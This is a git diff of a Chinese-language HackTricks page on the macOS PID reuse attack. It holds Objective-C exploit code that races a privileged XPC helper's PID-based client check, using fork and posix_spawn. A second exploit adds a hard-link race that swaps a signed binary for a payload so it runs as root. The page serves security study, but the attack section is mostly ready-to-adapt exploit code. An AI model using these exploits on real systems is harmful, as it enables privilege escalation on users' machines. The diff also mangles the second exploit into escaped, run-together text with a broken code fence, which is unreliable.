@@ -1,4 +1,4 @@
-# macOS PID 重用
+# macOS PID Reuse
 
 <details>
 
@@ -6,11 +6,11 @@
 
 支持 HackTricks 的其他方式：
 
-- 如果您想看到您的**公司在 HackTricks 中做广告**或**下载 PDF 版的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-- 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-- 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
-- **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** 上关注我们**。
-- **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR** 来分享您的黑客技巧。
+* 如果您想看到您的**公司在 HackTricks 中做广告**或**下载 PDF 版的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
+* 探索[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)\*\* 上关注我们\*\*。
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR** 来分享您的黑客技巧。
 
 </details>
 
@@ -29,11 +29,12 @@
 
 检查此示例攻击（同样摘自参考资料）以查看攻击的两个部分：
 
-- 一个**生成多个 fork**
-- **每个 fork** 将在发送消息后立即执行 **`posix_spawn`** 向 XPC 服务发送 **有效载荷**。
+* 一个**生成多个 fork**
+* **每个 fork** 将在发送消息后立即执行 **`posix_spawn`** 向 XPC 服务发送 **有效载荷**。
 
 {% hint style="danger" %}
 为了使攻击生效，重要的是 ` export`` `` `**`OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES`** 或将其放入攻击中：
+
 ```objectivec
 asm(".section __DATA,__objc_fork_ok\n"
 "empty:\n"
@@ -41,9 +42,8 @@ asm(".section __DATA,__objc_fork_ok\n"
 ```
 {% endhint %}
 
-{% tabs %}
-{% tab title="NSTasks" %}
-第一种选项是使用**`NSTasks`**和参数来启动子进程以利用RC
+第一种选项是使用\*\*`NSTasks`\*\*和参数来启动子进程以利用RC
+
 ```objectivec
 // Code from https://wojciechregula.blog/post/learn-xpc-exploitation-part-2-say-no-to-the-pid/
 // gcc -framework Foundation expl.m -o expl
@@ -149,141 +149,62 @@ create_nstasks();
 return 0;
 }
 ```
-{% endtab %}
 
-{% tab title="fork" %}
-这个示例使用原始的 **`fork`** 来启动 **利用 PID 竞争条件的子进程**，然后利用 **通过硬链接实现的另一个竞争条件**：
-```objectivec
-// export OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YES
-// gcc -framework Foundation expl.m -o expl
 
-#include <Foundation/Foundation.h>
-#include <spawn.h>
-#include <pthread.h>
 
-// TODO: CHANGE PROTOCOL AND FUNCTIONS
-@protocol HelperProtocol
-- (void)DoSomething:(void (^)(_Bool))arg1;
-@end
+这个示例使用原始的 \*\*\`fork\`\*\* 来启动 \*\*利用 PID 竞争条件的子进程\*\*，然后利用 \*\*通过硬链接实现的另一个竞争条件\*\*： \`\`\`objectivec // export OBJC\_DISABLE\_INITIALIZE\_FORK\_SAFETY=YES // gcc -framework Foundation expl.m -o expl
 
-// Global flag to track exploitation status
-bool pwned = false;
+\#include \<Foundation/Foundation.h> #include \<spawn.h> #include \<pthread.h>
 
-/**
-* Continuously overwrite the contents of the 'hard_link' file in a race condition to make the
-* XPC service verify the legit binary and then execute as root out payload.
-*/
-void *check_race(void *arg) {
-while(!pwned) {
-// Overwrite with contents of the legit binary
-system("cat ./legit_bin > hard_link");
-usleep(50000);
+// TODO: CHANGE PROTOCOL AND FUNCTIONS @protocol HelperProtocol
 
-// Overwrite with contents of the payload to execute
-// TODO: COMPILE YOUR OWN PAYLOAD BIN
-system("cat ./payload > hard_link");
-usleep(50000);
-}
-return NULL;
-}
+* (void)DoSomething:(void (^)(\_Bool))arg1; @end
 
-void child_xpc_pid_rc_abuse(){
-// TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION
-#define kValid "./Legit Updater.app/Contents/MacOS/Legit"
-extern char **environ;
+// Global flag to track exploitation status bool pwned = false;
 
-// Connect with XPC service
-// TODO: CHANGE THE ID OF THE XPC TO EXPLOIT
-NSString*  service_name = @"com.example.Helper";
-NSXPCConnection* connection = [[NSXPCConnection alloc] initWithMachServiceName:service_name options:0x1000];
-// TODO: CNAGE THE PROTOCOL NAME
-NSXPCInterface* interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)];
-[connection setRemoteObjectInterface:interface];
-[connection resume];
+/\*\*
 
-id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError* error) {
-NSLog(@"[-] Something went wrong");
-NSLog(@"[-] Error: %@", error);
-}];
+* Continuously overwrite the contents of the 'hard\_link' file in a race condition to make the
+* XPC service verify the legit binary and then execute as root out payload. \*/ void \*check\_race(void \*arg) { while(!pwned) { // Overwrite with contents of the legit binary system("cat ./legit\_bin > hard\_link"); usleep(50000);
 
-NSLog(@"obj: %@", obj);
-NSLog(@"conn: %@", connection);
+// Overwrite with contents of the payload to execute // TODO: COMPILE YOUR OWN PAYLOAD BIN system("cat ./payload > hard\_link"); usleep(50000); } return NULL; }
 
-// Call vulenrable XPC function
-// TODO: CHANEG NAME OF FUNCTION TO CALL
-[obj DoSomething:^(_Bool b){
-NSLog(@"Response, %hdd", b);
-}];
+void child\_xpc\_pid\_rc\_abuse(){ // TODO: INDICATE A VALID BIN TO BYPASS SIGN VERIFICATION #define kValid "./Legit Updater.app/Contents/MacOS/Legit" extern char \*\*environ;
 
-// Change current process to the legit binary suspended
-char target_binary[] = kValid;
-char *target_argv[] = {target_binary, NULL};
-posix_spawnattr_t attr;
-posix_spawnattr_init(&attr);
-short flags;
-posix_spawnattr_getflags(&attr, &flags);
-flags |= (POSIX_SPAWN_SETEXEC | POSIX_SPAWN_START_SUSPENDED);
-posix_spawnattr_setflags(&attr, flags);
-posix_spawn(NULL, target_binary, NULL, &attr, target_argv, environ);
-}
+// Connect with XPC service // TODO: CHANGE THE ID OF THE XPC TO EXPLOIT NSString\* service\_name = @"com.example.Helper"; NSXPCConnection\* connection = \[\[NSXPCConnection alloc] initWithMachServiceName:service\_name options:0x1000]; // TODO: CNAGE THE PROTOCOL NAME NSXPCInterface\* interface = \[NSXPCInterface interfaceWithProtocol:@protocol(HelperProtocol)]; \[connection setRemoteObjectInterface:interface]; \[connection resume];
 
-/**
-* Function to perform the PID race condition using children calling the XPC exploit.
-*/
-void xpc_pid_rc_abuse() {
-#define RACE_COUNT 1
-extern char **environ;
-int pids[RACE_COUNT];
+id obj = \[connection remoteObjectProxyWithErrorHandler:^(NSError\* error) { NSLog(@"\[-] Something went wrong"); NSLog(@"\[-] Error: %@", error); }];
 
-// Fork child processes to exploit
-for (int i = 0; i < RACE_COUNT; i++) {
-int pid = fork();
-if (pid == 0) {  // If a child process
-child_xpc_pid_rc_abuse();
-}
-printf("forked %d\n", pid);
-pids[i] = pid;
-}
+NSLog(@"obj: %@", obj); NSLog(@"conn: %@", connection);
 
-// Wait for children to finish their tasks
-sleep(3);
+// Call vulenrable XPC function // TODO: CHANEG NAME OF FUNCTION TO CALL \[obj DoSomething:^(\_Bool b){ NSLog(@"Response, %hdd", b); }];
 
-// Terminate child processes
-for (int i = 0; i < RACE_COUNT; i++) {
-if (pids[i]) {
-kill(pids[i], 9);
-}
-}
-}
+// Change current process to the legit binary suspended char target\_binary\[] = kValid; char \*target\_argv\[] = {target\_binary, NULL}; posix\_spawnattr\_t attr; posix\_spawnattr\_init(\&attr); short flags; posix\_spawnattr\_getflags(\&attr, \&flags); flags |= (POSIX\_SPAWN\_SETEXEC | POSIX\_SPAWN\_START\_SUSPENDED); posix\_spawnattr\_setflags(\&attr, flags); posix\_spawn(NULL, target\_binary, NULL, \&attr, target\_argv, environ); }
 
-int main(int argc, const char * argv[]) {
-// Create and set execution rights to 'hard_link' file
-system("touch hard_link");
-system("chmod +x hard_link");
+/\*\*
 
-// Create thread to exploit sign verification RC
-pthread_t thread;
-pthread_create(&thread, NULL, check_race, NULL);
+* Function to perform the PID race condition using children calling the XPC exploit. \*/ void xpc\_pid\_rc\_abuse() { #define RACE\_COUNT 1 extern char \*\*environ; int pids\[RACE\_COUNT];
 
-while(!pwned) {
-// Try creating 'download' directory, ignore errors
-system("mkdir download 2>/dev/null");
+// Fork child processes to exploit for (int i = 0; i < RACE\_COUNT; i++) { int pid = fork(); if (pid == 0) { // If a child process child\_xpc\_pid\_rc\_abuse(); } printf("forked %d\n", pid); pids\[i] = pid; }
 
-// Create a hardlink
-// TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC
-system("ln hard_link download/legit_bin");
+// Wait for children to finish their tasks sleep(3);
 
-xpc_pid_rc_abuse();
-usleep(10000);
+// Terminate child processes for (int i = 0; i < RACE\_COUNT; i++) { if (pids\[i]) { kill(pids\[i], 9); } } }
 
-// The payload will generate this file if exploitation is successfull
-if (access("/tmp/pwned", F_OK ) == 0) {
-pwned = true;
-}
-}
+int main(int argc, const char \* argv\[]) { // Create and set execution rights to 'hard\_link' file system("touch hard\_link"); system("chmod +x hard\_link");
 
-return 0;
-}
+// Create thread to exploit sign verification RC pthread\_t thread; pthread\_create(\&thread, NULL, check\_race, NULL);
+
+while(!pwned) { // Try creating 'download' directory, ignore errors system("mkdir download 2>/dev/null");
+
+// Create a hardlink // TODO: CHANGE NAME OF FILE FOR SIGN VERIF RC system("ln hard\_link download/legit\_bin");
+
+xpc\_pid\_rc\_abuse(); usleep(10000);
+
+// The payload will generate this file if exploitation is successfull if (access("/tmp/pwned", F\_OK ) == 0) { pwned = true; } }
+
+return 0; }
+
 ```
 ## 其他示例
 
@@ -307,3 +228,4 @@ return 0;
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
+```
